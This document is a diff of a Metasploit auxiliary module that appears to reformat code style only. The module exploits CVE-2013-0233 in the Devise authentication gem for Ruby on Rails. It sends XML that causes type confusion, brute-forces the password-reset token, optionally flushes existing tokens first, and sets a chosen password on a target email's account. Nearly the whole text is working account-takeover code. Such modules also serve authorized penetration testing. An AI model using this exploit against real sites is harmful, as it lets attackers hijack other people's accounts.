@@ -9,9 +9,11 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'          => 'Ruby on Rails Devise Authentication Password Reset',
-      'Description'   => %q{
+    super(
+      update_info(
+        info,
+        'Name' => 'Ruby on Rails Devise Authentication Password Reset',
+        'Description' => %q{
           The Devise authentication gem for Ruby on Rails is vulnerable
           to a password reset exploit leveraging type confusion.  By submitting XML
           to rails, we can influence the type used for the reset_password_token
@@ -27,14 +29,12 @@ class MetasploitModule < Msf::Auxiliary
           of this vulnerability, by quoting numeric values when comparing them with
           non numeric values.
         },
-      'Author'        =>
-        [
-          'joernchen', #original discovery and disclosure
-          'jjarmoc' #metasploit module
+        'Author' => [
+          'joernchen', # original discovery and disclosure
+          'jjarmoc' # metasploit module
         ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
+        'License' => MSF_LICENSE,
+        'References' => [
           [ 'CVE', '2013-0233'],
           [ 'OSVDB', '89642' ],
           [ 'BID', '57577' ],
@@ -43,39 +43,41 @@ class MetasploitModule < Msf::Auxiliary
           [ 'URL', 'https://github.com/rails/rails/commit/921a296a3390192a71abeec6d9a035cc6d1865c8' ],
           [ 'URL', 'https://github.com/rails/rails/commit/26e13c3ca71cbc7859cc4c51e64f3981865985d8']
         ],
-      'DisclosureDate' => '2013-01-28'
-    ))
+        'DisclosureDate' => '2013-01-28'
+      )
+    )
 
     register_options(
       [
-        OptString.new('TARGETURI', [ true,  'The request URI', '/users/password']),
+        OptString.new('TARGETURI', [ true, 'The request URI', '/users/password']),
         OptString.new('TARGETEMAIL', [true, 'The email address of target account']),
         OptString.new('OBJECTNAME', [true, 'The user object name', 'user']),
         OptString.new('PASSWORD', [true, 'The password to set']),
         OptBool.new('FLUSHTOKENS', [ true, 'Flush existing reset tokens before trying', true]),
         OptInt.new('MAXINT', [true, 'Max integer to try (tokens beginning with a higher int will fail)', 10])
-      ])
+      ]
+    )
   end
 
   def generate_token(account)
     # CSRF token from GET "/users/password/new" isn't actually validated it seems.
 
-    postdata="#{datastore['OBJECTNAME']}[email]=#{account}"
+    postdata = "#{datastore['OBJECTNAME']}[email]=#{account}"
 
     res = send_request_cgi({
-      'uri'     => normalize_uri(datastore['TARGETURI']),
-      'method'  => 'POST',
-      'data'    => postdata,
+      'uri' => normalize_uri(datastore['TARGETURI']),
+      'method' => 'POST',
+      'data' => postdata
     })
 
     unless res
-      print_error("No response from server")
+      print_error('No response from server')
       return false
     end
 
     if res.code == 200
-      error_text = res.body[/<div id=\"error_explanation\">\n\s+(.*?)<\/div>/m, 1]
-      print_error("Server returned error")
+      error_text = res.body[%r{<div id="error_explanation">\n\s+(.*?)</div>}m, 1]
+      print_error('Server returned error')
       vprint_error(error_text)
       return false
     end
@@ -83,22 +85,21 @@ class MetasploitModule < Msf::Auxiliary
     return true
   end
 
-  def clear_tokens()
+  def clear_tokens
     count = 0
     status = true
-    until (status == false) do
-      status = reset_one(Rex::Text.rand_text_alpha(rand(10) + 5))
+    until (status == false)
+      status = reset_one(Rex::Text.rand_text_alpha(rand(5..14)))
       count += 1 if status
     end
     vprint_status("Cleared #{count} tokens")
   end
 
-  def reset_one(password, report=false)
-
-    (0..datastore['MAXINT']).each{ |int_to_try|
+  def reset_one(password, report = false)
+    (0..datastore['MAXINT']).each do |int_to_try|
       encode_pass = REXML::Text.new(password).to_s
 
-      xml = ""
+      xml = ''
       xml << "<#{datastore['OBJECTNAME']}>"
       xml << "<password>#{encode_pass}</password>"
       xml << "<password_confirmation>#{encode_pass}</password_confirmation>"
@@ -106,14 +107,14 @@ class MetasploitModule < Msf::Auxiliary
       xml << "</#{datastore['OBJECTNAME']}>"
 
       res = send_request_cgi({
-          'uri'     => normalize_uri(datastore['TARGETURI']),
-          'method'  => 'PUT',
-          'ctype'   => 'application/xml',
-          'data'    => xml,
-        })
+        'uri' => normalize_uri(datastore['TARGETURI']),
+        'method' => 'PUT',
+        'ctype' => 'application/xml',
+        'data' => xml
+      })
 
       unless res
-        print_error("No response from server")
+        print_error('No response from server')
         return false
       end
 
@@ -121,9 +122,9 @@ class MetasploitModule < Msf::Auxiliary
       when 200
         # Failure, grab the error text
         # May need to tweak this for some apps...
-        error_text = res.body[/<div id=\"error_explanation\">\n\s+(.*?)<\/div>/m, 1]
-        if (report) && (error_text !~ /token/)
-          print_error("Server returned error")
+        error_text = res.body[%r{<div id="error_explanation">\n\s+(.*?)</div>}m, 1]
+        if report && (error_text !~ /token/)
+          print_error('Server returned error')
           vprint_error(error_text)
           return false
         end
@@ -134,32 +135,31 @@ class MetasploitModule < Msf::Auxiliary
         print_error("ERROR: received code #{res.code}")
         return false
       end
-    }
+    end
 
     print_error("No active reset tokens below #{datastore['MAXINT']} remain. Try a higher MAXINT.") if report
     return false
-
   end
 
   def run
     # Clear outstanding reset tokens, helps ensure we hit the intended account.
     if datastore['FLUSHTOKENS']
-      print_status("Clearing existing tokens...")
-      clear_tokens()
+      print_status('Clearing existing tokens...')
+      clear_tokens
     end
     # Generate a token for our account
     print_status("Generating reset token for #{datastore['TARGETEMAIL']}...")
     status = generate_token(datastore['TARGETEMAIL'])
     if status == false
-      print_error("Failed to generate reset token")
+      print_error('Failed to generate reset token')
       return
     end
-    print_good("Reset token generated successfully")
+    print_good('Reset token generated successfully')
 
     # Reset a password.  We're racing users creating other reset tokens.
     # If we didn't flush, we'll reset the account with the lowest ID that has a token.
     print_status("Resetting password to \"#{datastore['PASSWORD']}\"...")
     status = reset_one(datastore['PASSWORD'], true)
-    status ? print_good("Password reset worked successfully") : print_error("Failed to reset password")
+    status ? print_good('Password reset worked successfully') : print_error('Failed to reset password')
   end
 end
